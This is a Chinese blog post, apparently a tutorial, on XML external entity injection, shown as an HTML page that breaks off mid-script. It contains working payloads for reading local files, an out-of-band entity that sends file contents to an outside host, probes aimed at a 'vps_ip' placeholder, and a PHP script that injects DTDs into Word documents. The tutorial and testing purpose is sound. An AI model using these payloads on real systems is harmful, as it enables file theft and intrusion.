@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文发自 先知社区 ，转载请注明出处。  （ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。） WHATXMLXML是类似HTML的标记语言，但它们有所不同。  其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，H">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML外部实体注入小结">
+<meta property="og:url" content="https://findneo.github.io/180811-xxe-injection/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="本文发自 先知社区 ，转载请注明出处。  （ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。） WHATXMLXML是类似HTML的标记语言，但它们有所不同。  其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，H">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://findneo.github.io/180811-xxe-injection/1534066968195.png">
+<meta property="article:published_time" content="2018-08-11T11:18:24.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://findneo.github.io/180811-xxe-injection/1534066968195.png">
+
+<link rel="canonical" href="https://findneo.github.io/180811-xxe-injection/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>XML外部实体注入小结 | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180811-xxe-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XML外部实体注入小结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-08-11 19:18:24" itemprop="dateCreated datePublished" datetime="2018-08-11T19:18:24+08:00">2018-08-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>本文发自 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2571">先知社区</a> ，转载请注明出处。</strong> </p>
+<p>（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）</p>
+<h1 id="WHAT"><a href="#WHAT" class="headerlink" title="WHAT"></a>WHAT</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML是类似HTML的标记语言，但它们有所不同。</p>
+<ul>
+<li>其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。</li>
+<li>其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。</li>
+<li>此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。</li>
+<li><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; </code>  称为 <code>XML prolog</code> ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</li>
+</ul>
+<h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code> 。</p>
+<p>实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p>
+<p>DTD有两种形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内部 DTD：&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br><span class="line">外部 DTD：</span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;存放元素声明的文件的URI，可以是本地文件或网络文件&quot; [可选的元素声明]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;PUBLIC_ID DTD的名称&quot; &quot;外部DTD文件的URI&quot;&gt;</span><br><span class="line">（ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI）</span><br></pre></td></tr></table></figure>
+
+<h2 id="ENTITY"><a href="#ENTITY" class="headerlink" title="ENTITY"></a>ENTITY</h2><p>我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">声明：</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 内部普通实体名 &quot;实体所代表的字符串&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY 外部普通实体名 SYSTEM &quot;外部实体的URI&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 内部参数实体名 &quot;实体所代表的字符串&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 [&lt;!ENTITY % 外部参数实体名 SYSTEM &quot;外部实体的URI&quot;&gt;]&gt;</span><br><span class="line">除了 SYSTEM关键字外，外部实体还可用 PUBLIC关键字声明。</span><br><span class="line">引用：</span><br><span class="line">&amp;普通实体名; &#x2F;&#x2F;经实验，普通实体既可以在 DTD中，也可以在 XML中引用，可以在声明前引用，可以在在元素声明内部引用</span><br><span class="line">%参数实体名; &#x2F;&#x2F;经实验，参数实体只能在 DTD中引用，不能在声明前引用,不能在元素声明内部引用</span><br></pre></td></tr></table></figure>
+
+<h2 id="可能造成的危害"><a href="#可能造成的危害" class="headerlink" title="可能造成的危害"></a>可能造成的危害</h2><ul>
+<li>本地文件读取</li>
+<li>内网访问，主机/端口扫描</li>
+<li>网络访问</li>
+<li>系统命令执行（特定协议，如PHP的expect）</li>
+<li>拒绝服务（嵌套引用，指数爆炸）</li>
+</ul>
+<h1 id="HOW"><a href="#HOW" class="headerlink" title="HOW"></a>HOW</h1><p>URI支持的协议：</p>
+<p><img data-src="1534066968195.png" alt="scheme support"></p>
+<h2 id="利用引用外部DTD发起网络请求"><a href="#利用引用外部DTD发起网络请求" class="headerlink" title="利用引用外部DTD发起网络请求"></a>利用引用外部DTD发起网络请求</h2><p><code>test.php</code> 使用外部DTD对XML进行验证，如果XML可以注入且DTD的URI可控，就有发起网络请求的可能。在<code>192.168.1.2:80</code> 有Web服务而<code>192.168.1.3:80</code> 没有，DTD的URI不同时访问 <code>test.php</code> 就会得到不同的响应。</p>
+<p>test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument;</span><br><span class="line"><span class="variable">$dom</span>-&gt;load(<span class="string">&#x27;with_external_dtd.xml&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$dom</span>-&gt;validate()) &#123;<span class="keyword">echo</span> <span class="string">&quot;validated!\n&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;invalid!\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>with_external_dtd.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 很快返回 validated! --&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;external_dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 很快返回 invalid! --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;!DOCTYPE note SYSTEM &quot;http://192.168.1.2/&quot;&gt; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 很长一段时间才返回 invalid! --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;!DOCTYPE note SYSTEM &quot;http://192.168.1.3/&quot;&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>Valar Morghulis<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>external_dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用普通XXE读取文件-访问网络"><a href="#利用普通XXE读取文件-访问网络" class="headerlink" title="利用普通XXE读取文件/访问网络"></a>利用普通XXE读取文件/访问网络</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span>=&lt;&lt;&lt;<span class="keyword">string</span></span><br><span class="line">&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line"><span class="keyword">string</span>;</span><br><span class="line"><span class="keyword">echo</span> simplexml_load_string(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用参数XXE读取文件-访问网络"><a href="#利用参数XXE读取文件-访问网络" class="headerlink" title="利用参数XXE读取文件/访问网络"></a>利用参数XXE读取文件/访问网络</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span>=&lt;&lt;&lt;<span class="keyword">string</span></span><br><span class="line">&lt;!DOCTYPE a [&lt;!ENTITY % b SYSTEM <span class="string">&quot;http://127.0.0.1:8088/evil.txt&quot;</span>&gt;%b;]&gt;</span><br><span class="line">&lt;c&gt;&amp;d;&lt;/c&gt;</span><br><span class="line"><span class="keyword">string</span>;</span><br><span class="line"><span class="keyword">echo</span> simplexml_load_string(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">// evil.txt :  &lt;!ENTITY d SYSTEM &quot;php://filter/convert.base64-encode/resource=C:/Windows/win.ini&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE-OOB"><a href="#XXE-OOB" class="headerlink" title="XXE OOB"></a>XXE OOB</h2><p>如果没有回显也没关系，可以利用外部参数实体将文件内容发送出去。这里注意参数实体引用 <code>%file;</code> 必须放在外部文件里，因为根据这条 <a target="_blank" rel="noopener" href="https://www.w3.org/TR/xml/#wfc-PEinInternalSubset">规则</a> ，在内部DTD里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser会报错： <code>PEReferences forbidden in internal subset </code> 。这里的<code>internal subset</code> 指的是中括号<code>[]</code> 内部的一系列元素声明，<code>PEReferences </code> 指的应该是参数实体引用 <code>Parameter-Entity Reference</code> 。</p>
+<p>感觉在技术方面英文的表达力更强，这种情况叫做 <code>fetch external parsed entities using PEReference</code> 更好理解。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span>=&lt;&lt;&lt;<span class="keyword">string</span></span><br><span class="line">&lt;!DOCTYPE a [&lt;!ENTITY % xxe SYSTEM <span class="string">&quot;http://127.0.0.1:8088/xxe.txt&quot;</span>&gt; %xxe;]&gt;</span><br><span class="line"><span class="keyword">string</span>;</span><br><span class="line">simplexml_load_string(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">/* // http://127.0.0.1:8088/xxe.txt:</span></span><br><span class="line"><span class="comment">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C:/Windows/win.ini&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;!ENTITY % x &#x27;&lt;!ENTITY &amp;#37; send SYSTEM &quot;http://127.0.0.1:8088/%file;&quot;&gt;&#x27;&gt; %x;</span></span><br><span class="line"><span class="comment">%send;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h1><ul>
+<li>在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发。<ul>
+<li>WooYun-2014-73321（网易邮箱某处XXE可读取文件）</li>
+<li>WooYun-2014-73439（QQ邮箱XXE可读取任意文件）</li>
+<li>……</li>
+</ul>
+</li>
+<li>直接处理POST XML数据。WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）等很多。许多是直接 <code>simplexml_load_string</code> 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。</li>
+<li>XML处理工具<ul>
+<li>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。</li>
+<li>WooYun-2015-134057（百度某平台Blind XXE漏洞&amp;可Bool型SSRF攻击）XML检查工具。</li>
+<li>WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) XML检查工具</li>
+</ul>
+</li>
+<li>WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。</li>
+<li>WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。</li>
+<li>WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。</li>
+<li>WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞  ）登陆与重置密码时使用XML传输数据。</li>
+<li>WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。</li>
+<li>WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 <code>content-type </code> 来区别对待提交的数据。<code>application/x-www-form-urlencoded</code> 、<code>application/json</code> 、<code>application/xml</code> 被用不同的方式解析。XML直接调用 <code>simplexml_load_string</code> 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。</li>
+<li>WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 <code>关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。</code> ，我觉得有道理。<code>xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生</code> 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。</li>
+<li>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件<code>/home/run/ssh_go.sh</code> ，内含SSH登陆密码 orz。</li>
+<li>一些其他案例<ul>
+<li><a target="_blank" rel="noopener" href="https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution">XXE in OpenID: one bug to rule them all, or how I found a Remote Code Execution flaw affecting Facebook’s servers</a> 【Facebook OpenID功能点的XRDS XXE】<ul>
+<li><a target="_blank" rel="noopener" href="https://sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/">Revisting XXE and abusing protocols</a> 的分析者利用该原理在其他OpenID平台结合expect模块实现了RCE。</li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745">XXE on Windows system …then what ??</a> 【XXE+SMB=&gt;内网RCE】</li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2448">Apache Solr XXE漏洞分析 -【CVE-2018-8026 】</a> </li>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/395296">Phone Call to XXE via Interactive Voice Response</a> 【打个电话也能XXE :)】</li>
+</ul>
+</li>
+</ul>
+<h1 id="发现XXE"><a href="#发现XXE" class="headerlink" title="发现XXE"></a>发现XXE</h1><p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p>
+<ul>
+<li>单双引号 <code>&#39; &quot; </code> 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。</li>
+<li>尖括号<code>&lt; &gt;</code>。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。</li>
+<li>注释符 <code>&lt;!-- </code> 。XML使用 <code>&lt;!-- This is a comment --&gt;</code>  作注释。</li>
+<li><code>&amp;</code> 。&amp; 用于引用实体。</li>
+<li>CDATA 分隔符<code>]]&gt;</code> 。<code>&lt;![CDATA[foo]]&gt; </code> 中的内容不被parser解析，提前闭合引发异常。</li>
+</ul>
+<p>尝试利用实体和DTD。</p>
+<ul>
+<li>引用外部DTD文件访问内网主机/端口。<code>&lt;!DOCTYPE a SYSTEM &quot;http://127.0.0.1:2333&quot;&gt;</code> （看响应时间）</li>
+<li>引用外部DTD文件访问外网。<code>&lt;!DOCTYPE a SYSTEM &quot;http://vps_ip&quot; &gt;</code></li>
+<li>引用内部实体。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe &quot;findneo&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code></li>
+<li>外部实体读本地文件。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code></li>
+<li>外部实体访问内网主机/端口。<code>&lt;!DOCTYPE a SYSTEM &quot;http://192.168.1.2:80&quot;&gt; </code>（看响应时间）</li>
+<li>外部实体访问外网。<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;http://vps_ip&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code> </li>
+<li>判断问题存在可以OOB提取数据。</li>
+</ul>
+<h1 id="生成恶意Word文档"><a href="#生成恶意Word文档" class="headerlink" title="生成恶意Word文档"></a>生成恶意Word文档</h1><p>上面提到的多个案例都需要用到自定义DTD的docx文件，有个名为 <a target="_blank" rel="noopener" href="https://buer.haus/xxegen/">XXEGen</a> 的在线网站可以方便地生成和监听（也可自定义监听地址），从而方便快速地测试XXE是否存在，但目前看来还不支持自定义DTD，如果需要用到OOB之类的技术，可能就不太方便。</p>
+<p>所以我写了个小脚本，可以用来生成一个正常docx文件，然后注入自定义的DTD和实体引用。另外新版的word软件默认禁用DTD，trigger 函数还可以本地测试下word文件是否有问题。</p>
+<p>其实修改 docx 文件的原理很简单，手动也可以做。解压 demo.docx 到 demo文件夹 ，直接修改 <code> demo/word/document.xml</code>  文件内容，全选 demo 文件夹中的文件，使用 7zip 的仅存储方式压缩成 demo2.docx 即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// by https://github.com/findneo</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genword</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$filecontent</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$word</span> = <span class="keyword">new</span> COM(<span class="string">&quot;word.application&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to instantiate Word&quot;</span>);</span><br><span class="line">    <span class="variable">$word</span>-&gt;Visible = <span class="number">0</span>;<span class="comment">//保持程序在后台运行</span></span><br><span class="line">    <span class="variable">$word</span>-&gt;Documents-&gt;Add();<span class="comment">//新建Word文档</span></span><br><span class="line">    <span class="variable">$word</span>-&gt;Selection-&gt;TypeText(<span class="variable">$filecontent</span>);<span class="comment">//写入指定内容</span></span><br><span class="line">    <span class="variable">$word</span>-&gt;Documents[<span class="number">1</span>]-&gt;SaveAs(getcwd().<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>);<span class="comment">//保存到指定路径</span></span><br><span class="line">    <span class="variable">$word</span>-&gt;Quit();<span class="comment">//退出程序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poisonWord</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$flag</span>,<span class="variable">$dtd</span>,<span class="variable">$entity_reference</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    <span class="variable">$zip</span>-&gt;open(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$xml</span>=<span class="variable">$zip</span>-&gt;getFromName(<span class="string">&#x27;word/document.xml&#x27;</span>);</span><br><span class="line">    <span class="variable">$prolog</span>=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$evilxml</span>=str_replace([<span class="variable">$prolog</span>,<span class="variable">$flag</span>],[<span class="variable">$prolog</span>.<span class="variable">$dtd</span>,<span class="variable">$flag</span>.<span class="variable">$entity_reference</span>],<span class="variable">$xml</span>);<span class="comment">//构造恶意XML</span></span><br><span class="line">    <span class="variable">$zip</span>-&gt;deleteName(<span class="string">&#x27;word/document.xml&#x27;</span>);</span><br><span class="line">    <span 